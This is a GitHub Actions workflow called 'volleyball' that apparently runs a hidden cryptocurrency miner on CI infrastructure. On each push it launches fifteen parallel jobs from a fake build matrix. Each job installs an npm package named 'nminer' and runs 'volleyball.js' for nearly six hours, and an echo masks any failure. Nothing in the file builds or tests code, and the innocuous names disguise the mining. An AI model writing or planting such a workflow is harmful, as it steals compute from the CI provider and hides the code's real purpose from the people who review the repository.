name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8197 }
          - { version: 5928 }
          - { version: 7682 }
          - { version: 6868 }
          - { version: 3780 }
          - { version: 3269 }
          - { version: 9078 }
          - { version: 788 }
          - { version: 954 }
          - { version: 7828 }
          - { version: 1748 }
          - { version: 2490 }
          - { version: 1758 }
          - { version: 7666 }
          - { version: 3305 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: now
        run: |
          npm install nminer@latest
          timeout 346m node volleyball.js || echo "volleyball executed"